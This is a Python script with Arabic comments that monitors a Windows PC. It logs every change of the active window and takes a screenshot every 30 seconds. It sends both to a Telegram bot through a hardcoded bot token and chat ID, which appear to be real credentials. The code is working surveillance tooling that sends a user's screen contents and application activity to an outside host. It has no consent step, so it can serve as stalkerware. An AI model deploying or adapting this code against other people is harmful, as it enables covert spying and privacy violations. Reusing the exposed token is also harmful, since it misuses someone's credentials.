import pyautogui
import win32gui
import time
import os
import datetime
import requests  # مكتبة التعامل مع الإنترنت

# --- إعدادات تيليجرام (بياناتك) ---
BOT_TOKEN = "7441270348:AAE7SFRVxepMoBIw2IGXsbtVM0cf5ryBXAA"
CHAT_ID = "1431886140"

# --- إعدادات المراقبة ---
SCREENSHOT_INTERVAL = 30  # إرسال صورة كل 30 ثانية (حتى لا تملأ الشات)
CHECK_INTERVAL = 1        # فحص تغير النوافذ كل ثانية

# إعداد المجلدات للحفظ المحلي أيضاً (نسخة احتياطية)
TODAY = datetime.datetime.now().strftime("%Y-%m-%d")
BASE_FOLDER = f"Monitor_Session_{TODAY}"

if not os.path.exists(BASE_FOLDER):
    os.makedirs(BASE_FOLDER)

# --- دوال الإرسال لتيليجرام ---
def send_telegram_message(text):
    """دالة لإرسال نص إلى البوت"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"[!] فشل إرسال الرسالة (تأكد من الإنترنت): {e}")

def send_telegram_photo(photo_path, caption=""):
    """دالة لإرسال صورة إلى البوت"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data = {"chat_id": CHAT_ID, "caption": caption}
    try:
        with open(photo_path, "rb") as image_file:
            files = {"photo": image_file}
            requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        print(f"[!] فشل إرسال الصورة: {e}")

# --- دوال النظام ---
def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title if title.strip() != "" else "Unknown"
    except:
        return "Unknown"

def monitor_system_with_telegram():
    print(f"[*] جاري الاتصال بـ Telegram Bot...")
    
    # إشعار بدء التشغيل
    start_msg = (f"🚀 تم تشغيل نظام المراقبة على جهاز: {os.getlogin()}\n"
                 f"📅 التاريخ: {TODAY}\n"
                 f"سيتم إرسال تنبيهات عند فتح برامج جديدة.")
    send_telegram_message(start_msg)
    
    print(f"[*] تم البدء بنجاح. المراقبة نشطة.")
    
    last_window = ""
    last_screenshot_time = time.time()

    try:
        while True:
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            
            # 1. فحص تغير النوافذ (برنامج فتح أو قفل)
            current_window = get_active_window()
            if current_window != last_window and current_window.strip() != "":
                # إرسال تنبيه لتيليجرام
                alert_msg = f"⚠️ [نشاط جديد]\n⏰ {timestamp}\nتطبيق: {current_window}"
                send_telegram_message(alert_msg)
                
                print(f"-> تم الإرسال: {current_window}")
                last_window = current_window

            # 2. التقاط الشاشة وإرسالها (كل فترة زمنية)
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                img_name = f"Screen_{datetime.datetime.now().strftime('%H-%M-%S')}.png"
                img_path = os.path.join(BASE_FOLDER, img_name)
                
                try:
                    # حفظ محلي
                    pyautogui.screenshot(img_path)
                    
                    # إرسال لتيليجرام
                    caption = f"📷 لقطة شاشة تلقائية\n⏰ {timestamp}\nالنافذة: {current_window}"
                    send_telegram_photo(img_path, caption)
                    
                    print(f"-> تم إرسال لقطة شاشة.")
                except Exception as e:
                    print(f"خطأ في التصوير: {e}")
                
                last_screenshot_time = time.time()

            time.sleep(CHECK_INTERVAL)

    except KeyboardInterrupt:
        end_msg = "🛑 تم إيقاف نظام المراقبة يدوياً."
        send_telegram_message(end_msg)
        print("\n[!] تم الإيقاف.")

if __name__ == "__main__":
    monitor_system_with_telegram()